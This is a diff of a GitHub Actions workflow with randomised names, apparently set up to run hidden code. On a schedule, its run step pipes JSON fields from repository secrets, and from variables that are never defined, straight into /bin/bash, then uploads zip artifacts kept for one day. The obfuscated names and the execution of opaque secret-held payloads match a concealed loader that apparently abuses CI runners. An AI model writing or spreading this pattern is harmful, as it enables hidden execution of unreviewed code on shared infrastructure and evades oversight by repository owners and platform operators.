@@ -1,26 +1,25 @@
 name: sixingyinghong
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '28 4/6 * * *'
-jobs:  # 18273
+    - cron: '5 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: sixingyinghong
         env:
-          bscn37943: ${{ secrets.bscn37943 }}
+          wcizs4: ${{ secrets.wcizs4 }}
         run: |
-          echo $bscn37943 | jq -r .xqn7033 | /bin/bash
-          echo $wtayg2865 | jq -r .e81873 | /bin/bash
-          echo $ikxaj7 | jq -r .lh990 | /bin/bash
-          echo $nyqz8 | jq -r .fhe0 | /bin/bash
-          echo $ve5 | jq -r .wr55176 | /bin/bash
-          echo $bw64567 | jq -r .e6 | /bin/bash
-          echo $bsr86 | jq -r .b054 | /bin/bash
-          echo $qyajc387 | jq -r .ebwg2 | /bin/bash
-          echo $ozh45062 | jq -r .gi61151 | /bin/bash
-          echo $xxumu313 | jq -r .h5 | /bin/bash
-          echo $kakj73569 | jq -r .bivyw95473 | /bin/bash
+          printf '%s' "$wcizs4" | jq -r .hxcgn9206 | /bin/bash
+          printf '%s' "$hx65" | jq -r .eawbk690 | /bin/bash
+          printf '%s' "$u67" | jq -r .afe53776 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: abN46pCx
+          path: "*.zip"
+          retention-days: 1
